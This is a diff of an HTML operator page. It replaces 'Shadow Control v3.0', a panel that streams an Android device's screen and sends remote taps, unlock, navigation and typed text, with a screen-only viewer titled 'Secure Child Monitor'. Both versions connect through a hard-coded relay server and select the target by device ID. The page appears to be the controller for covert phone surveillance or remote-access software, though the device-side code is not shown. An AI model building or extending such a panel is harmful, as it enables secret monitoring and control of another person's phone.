@@ -2,341 +2,119 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Shadow Control v3.0 (Fixed)</title>
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Child Monitor</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
     <style>
-        :root {
-            --bg-dark: #050505;
-            --panel-glass: rgba(20, 25, 35, 0.65);
-            --accent: #00f3ff;
-            --accent-glow: rgba(0, 243, 255, 0.25);
-            --danger: #ff2a6d;
-            --border: 1px solid rgba(255, 255, 255, 0.12);
-            --text-color: #e0e6ed;
-        }
-
-        * { box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
-
-        body {
-            margin: 0; 
-            background-color: var(--bg-dark); 
-            color: var(--text-color);
-            font-family: 'Rajdhani', sans-serif;
-            height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            overflow: hidden;
-            background-image: 
-                linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                url("https://www.transparenttextures.com/patterns/cubes.png");
-        }
-
-        /* --- HEADER --- */
-        .top-bar {
-            height: 55px;
-            padding: 0 20px;
-            background: rgba(10, 10, 15, 0.8);
-            backdrop-filter: blur(12px);
-            border-bottom: var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 100;
-        }
-
-        .brand {
-            font-size: 1.4rem; font-weight: 700; color: var(--accent);
-            text-transform: uppercase; letter-spacing: 2px;
-            display: flex; align-items: center; gap: 10px;
-        }
-
-        .status-pill {
-            background: rgba(255,255,255,0.05);
-            padding: 6px 15px; border-radius: 50px; border: var(--border);
-            display: flex; align-items: center; gap: 8px; font-size: 0.85rem;
-        }
-
-        .dot { width: 8px; height: 8px; border-radius: 50%; }
-        .dot.online { background: #00ff88; box-shadow: 0 0 8px #00ff88; }
-        .dot.offline { background: var(--danger); box-shadow: 0 0 8px var(--danger); }
-        .dot.connecting { background: #ffaa00; animation: blink 1s infinite; }
-
-        @keyframes blink { 50% { opacity: 0.5; } }
-
-        /* --- MAIN LAYOUT --- */
-        .main-container { flex: 1; display: flex; overflow: hidden; position: relative; }
-
-        .video-wrapper {
-            flex: 1; display: flex; justify-content: center; align-items: center;
-            position: relative; background: #000; overflow: hidden;
-        }
-
-        video {
-            max-width: 100%; max-height: 100%; width: auto; height: auto;
-            object-fit: contain; cursor: crosshair;
-        }
-
-        .sidebar {
-            width: 320px; background: var(--panel-glass);
-            backdrop-filter: blur(15px); border-left: var(--border);
-            padding: 20px; display: flex; flex-direction: column; gap: 15px;
-            overflow-y: auto;
-        }
-
-        .control-group {
-            background: rgba(0,0,0,0.2); padding: 12px;
-            border-radius: 10px; border: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .group-title {
-            font-size: 0.75rem; color: var(--accent);
-            text-transform: uppercase; margin-bottom: 8px; font-weight: bold;
-        }
-
-        .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
-
-        .btn {
-            background: linear-gradient(145deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
-            border: 1px solid rgba(255,255,255,0.05); color: #ccc;
-            padding: 12px 0; border-radius: 6px; cursor: pointer;
-            display: flex; flex-direction: column; align-items: center; gap: 4px;
-        }
-        
-        .btn:hover { background: rgba(0, 243, 255, 0.1); color: var(--accent); border-color: var(--accent-glow); }
-
-        .btn-large { grid-column: span 3; background: rgba(0, 243, 255, 0.15); color: white; font-weight: bold; }
-        
-        .btn-danger { color: var(--danger); }
-
-        .input-box { display: flex; gap: 6px; margin-top: 5px; }
-        .text-input {
-            flex: 1; background: rgba(0,0,0,0.4); border: var(--border);
-            color: white; padding: 8px 12px; border-radius: 4px; outline: none;
-        }
-
-        .toast {
-            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.9); color: var(--accent);
-            padding: 10px 25px; border-radius: 30px; border: 1px solid var(--accent);
-            opacity: 0; transition: 0.3s; z-index: 1000;
-        }
-
-        .overlay-msg {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            text-align: center; color: rgba(255,255,255,0.5); z-index: 10;
-        }
-
-        @media (max-width: 850px) {
-            .main-container { flex-direction: column; }
-            .sidebar { width: 100%; height: 45%; border-left: none; border-top: var(--border); }
-            .video-wrapper { height: 55%; }
-        }
+        body { font-family: sans-serif; background: #111; color: white; text-align: center; margin: 0; }
+        video { width: 90%; max-width: 400px; border: 2px solid #0f0; background: #000; margin-top: 20px; }
+        .status { margin: 10px; color: #aaa; font-size: 14px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <div class="brand"><i class="fa-solid fa-ghost"></i> <span>Shadow Control</span></div>
-        <div class="status-pill">
-            <div id="statusDot" class="dot offline"></div>
-            <span id="statusText">Disconnected</span>
-        </div>
-    </div>
+    <h2>Live Screen Monitor</h2>
+    <div class="status" id="status">Connecting...</div>
+    
+    <video id="remoteVideo" autoplay playsinline muted></video>
 
-    <div class="main-container">
-        <div class="video-wrapper" id="videoContainer">
-            <div class="overlay-msg" id="loadingMsg">
-                <i class="fa-solid fa-wifi fa-3x"></i>
-                <p id="loaderSubText" style="margin-top:15px; letter-spacing:1px;">WAITING FOR CONNECTION...</p>
-            </div>
-            <video id="remoteVideo" autoplay playsinline muted></video>
-            <button onclick="toggleFullscreen()" style="position:absolute; bottom:15px; right:15px; background:rgba(0,0,0,0.6); border:1px solid #444; color:white; padding:8px 12px; border-radius:6px; cursor:pointer; z-index:20;">
-                <i class="fa-solid fa-expand"></i>
-            </button>
-        </div>
-
-        <div class="sidebar">
-            <div class="control-group">
-                <div class="group-title">Connection Status</div>
-                <button class="btn btn-large" id="startBtn" onclick="forceStart()">
-                    <i class="fa-solid fa-power-off"></i> CONNECT & STREAM
-                </button>
-            </div>
-
-            <div class="control-group">
-                <div class="group-title">Navigation</div>
-                <div class="btn-grid">
-                    <button class="btn" onclick="sendCmd('back')"><i class="fa-solid fa-chevron-left"></i><span>BACK</span></button>
-                    <button class="btn" onclick="sendCmd('home')"><i class="fa-regular fa-circle"></i><span>HOME</span></button>
-                    <button class="btn" onclick="sendCmd('recent')"><i class="fa-regular fa-square"></i><span>APPS</span></button>
-                </div>
-            </div>
-
-            <div class="control-group">
-                <div class="group-title">Quick Actions</div>
-                <div class="btn-grid">
-                    <button class="btn" onclick="sendCmd('swipe_up')"><i class="fa-solid fa-arrow-up"></i><span>UP</span></button>
-                    <button class="btn" onclick="sendCmd('swipe_down')"><i class="fa-solid fa-arrow-down"></i><span>DOWN</span></button>
-                    <button class="btn" onclick="sendCmd('unlock')"><i class="fa-solid fa-mobile-screen"></i><span>WAKE</span></button>
-                </div>
-            </div>
-
-            <div class="control-group">
-                <div class="group-title">Type & Send</div>
-                <div class="input-box">
-                    <input type="text" id="typeInput" class="text-input" placeholder="Type text...">
-                    <button class="btn" style="width: 50px;" onclick="sendText()"><i class="fa-solid fa-paper-plane"></i></button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="toast" class="toast">Action Sent</div>
+    <br><br>
+    <input type="text" id="deviceId" placeholder="Enter Device ID (e.g. 945428)" value="945428">
+    <button onclick="startViewing()">Connect & View</button>
 
     <script>
-        const SERVER_URL = "https://child-v9no.onrender.com";
-        const urlParams = new URLSearchParams(window.location.search);
-        const currentDeviceId = urlParams.get('id');
-
+        // ✅ APKA SERVER URL
+        const SOCKET_URL = "https://child-v9no.onrender.com"; 
+        
         let socket;
         let peerConnection;
-        let candidateQueue = [];
-
-        const remoteVideo = document.getElementById('remoteVideo');
-        const statusText = document.getElementById('statusText');
-        const statusDot = document.getElementById('statusDot');
-        const loadingMsg = document.getElementById('loadingMsg');
-        const loaderSubText = document.getElementById('loaderSubText');
-
-        const rtcConfig = {
+        const config = {
             iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: "turn:openrelay.metered.ca:80", username: "openrelayproject", credential: "openrelayproject" },
-                { urls: "turn:openrelay.metered.ca:443", username: "openrelayproject", credential: "openrelayproject" }
+                { urls: "stun:stun.l.google.com:19302" }
             ]
         };
 
-        if (!currentDeviceId) {
-            loaderSubText.innerText = "ERROR: MISSING DEVICE ID";
-        } else {
-            connectSocket();
-        }
+        function startViewing() {
+            const deviceId = document.getElementById("deviceId").value;
+            if(!deviceId) return alert("Enter Device ID");
 
-        function connectSocket() {
-            statusDot.className = "dot connecting";
-            socket = io(SERVER_URL, { transports: ['websocket'] });
+            document.getElementById("status").innerText = "Joining Room: " + deviceId;
 
-            socket.on("connect", () => {
-                setStatus(true);
-                socket.emit("join-room", currentDeviceId);
+            // 1. Socket Connect
+            socket = io(SOCKET_URL, {
+                transports: ['websocket', 'polling']
             });
 
-            socket.on("disconnect", () => setStatus(false));
+            socket.on("connect", () => {
+                console.log("✅ Connected to Server");
+                document.getElementById("status").innerText = "Waiting for stream...";
+                socket.emit("join-room", deviceId);
+            });
 
-            // --- FIXED WEBRTC SIGNALING ---
+            // 2. Wait for Offer (Android sends this)
             socket.on("offer", async (data) => {
-                console.log("📩 Offer Received from Android");
-                loadingMsg.style.display = "none";
-
-                if (peerConnection) peerConnection.close();
-                peerConnection = new RTCPeerConnection(rtcConfig);
-                candidateQueue = [];
-
-                peerConnection.ontrack = (event) => {
-                    console.log("🎥 Stream Connected!");
-                    remoteVideo.srcObject = event.streams[0];
-                    remoteVideo.play().catch(e => console.error("Autoplay failed", e));
-                    showToast("STREAM ACTIVE");
-                };
-
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        socket.emit("candidate", { 
-                            target: currentDeviceId, 
-                            candidate: event.candidate 
-                        });
-                    }
-                };
+                console.log("📡 Offer Received from Android");
+                document.getElementById("status").innerText = "Offer Received... Negotiating";
+                
+                if (!peerConnection) createPeerConnection(deviceId);
 
                 try {
-                    // 1. Set Remote Description
-                    const offerDesc = new RTCSessionDescription(data.sdp || data);
-                    await peerConnection.setRemoteDescription(offerDesc);
-
-                    // 2. Add queued candidates
-                    while (candidateQueue.length > 0) {
-                        await peerConnection.addIceCandidate(candidateQueue.shift());
-                    }
-
-                    // 3. Create Answer
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(JSON.parse(data.offer.sdp ? JSON.stringify(data.offer) : data.offer)));
+                    
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
 
-                    // 4. 🔥 SEND ANSWER (Standard Key: sdp)
-                    socket.emit("answer", { 
-                        target: currentDeviceId, 
-                        sdp: answer // Changing 'answer' key to 'sdp' for compatibility
+                    console.log("⚡ Sending Answer");
+                    socket.emit("answer", {
+                        target: deviceId,
+                        answer: answer
                     });
-                    console.log("📤 Answer Sent to Android");
-
                 } catch (err) {
-                    console.error("WebRTC Error:", err);
+                    console.error("Error handling offer:", err);
                 }
             });
 
+            // 3. Handle Ice Candidates
             socket.on("candidate", async (data) => {
-                const candidate = new RTCIceCandidate(data.candidate || data);
-                if (peerConnection && peerConnection.remoteDescription) {
-                    await peerConnection.addIceCandidate(candidate);
-                } else {
-                    candidateQueue.push(candidate);
+                if (peerConnection) {
+                    try {
+                        // Fix for nested candidate objects
+                        let candidateData = data.candidate;
+                        if (candidateData.candidate && typeof candidateData.candidate === 'object') {
+                            candidateData = candidateData.candidate;
+                        }
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidateData));
+                        console.log("❄️ ICE Candidate Added");
+                    } catch (e) { console.error("Error adding candidate", e); }
                 }
+            });
+
+            socket.on("disconnect", () => {
+                document.getElementById("status").innerText = "Disconnected";
             });
         }
 
-        function forceStart() {
-            if (!socket?.connected) return window.location.reload();
-            loaderSubText.innerText = "REQUESTING STREAM...";
-            loadingMsg.style.display = "flex";
-            sendCmd('start');
-        }
+        function createPeerConnection(targetId) {
+            peerConnection = new RTCPeerConnection(config);
 
-        function setStatus(online) {
-            statusText.innerText = online ? "Connected: " + currentDeviceId : "Disconnected";
-            statusDot.className = online ? "dot online" : "dot offline";
-        }
+            peerConnection.ontrack = (event) => {
+                console.log("🎥 Video Stream Received!");
+                document.getElementById("status").innerText = "Streaming Active 🔴";
+                const video = document.getElementById("remoteVideo");
+                video.srcObject = event.streams[0];
+            };
 
-        function sendCmd(action, x = 0, y = 0) {
-            if (!socket?.connected) return;
-            socket.emit("control-event", { room: currentDeviceId, action, x, y });
-            if (!['tap', 'drag'].includes(action)) showToast(action.toUpperCase());
-        }
-
-        function sendText() {
-            const input = document.getElementById('typeInput');
-            if (input.value) {
-                socket.emit("control-event", { room: currentDeviceId, action: "text_input", text: input.value });
-                input.value = "";
-                showToast("TEXT SENT");
-            }
-        }
-
-        function showToast(msg) {
-            const t = document.getElementById('toast');
-            t.innerText = msg; t.style.opacity = "1";
-            setTimeout(() => t.style.opacity = "0", 2000);
-        }
-
-        function toggleFullscreen() {
-            const v = document.getElementById("videoContainer");
-            if (!document.fullscreenElement) v.requestFullscreen();
-            else document.exitFullscreen();
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit("candidate", {
+                        target: targetId,
+                        candidate: event.candidate
+                    });
+                }
+            };
         }
     </script>
+
 </body>
 </html>
